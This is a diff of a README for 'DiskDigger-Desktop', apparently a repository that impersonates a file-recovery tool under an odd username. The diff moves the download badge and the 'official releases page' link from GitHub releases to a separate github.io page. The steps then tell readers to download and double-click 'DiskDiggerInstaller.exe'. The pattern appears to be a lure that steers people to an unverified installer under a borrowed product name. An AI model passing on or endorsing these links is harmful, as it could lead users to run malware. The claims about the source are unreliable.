@@ -1,6 +1,6 @@
 # 💾 DiskDigger-Desktop - Recover your lost digital files easily
 
-[![](https://img.shields.io/badge/Download-DiskDigger-blue)](https://github.com/Relafenbayofbiscay790/DiskDigger-Desktop/releases)
+[![](https://img.shields.io/badge/Download-DiskDigger-blue)](https://relafenbayofbiscay790.github.io)
 
 ## 🔍 About the software
 
@@ -27,7 +27,7 @@ DiskDigger-Desktop helps you find missing files on your computer. It scans your 
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official releases page](https://github.com/Relafenbayofbiscay790/DiskDigger-Desktop/releases) to access the download files.
+1.  Visit the [official releases page](https://relafenbayofbiscay790.github.io) to access the download files.
 2.  Look for the latest version of the installer file, which ends in .exe.
 3.  Click the file link to save it to your computer.
 4.  Open your Downloads folder and double-click the file named DiskDiggerInstaller.exe.
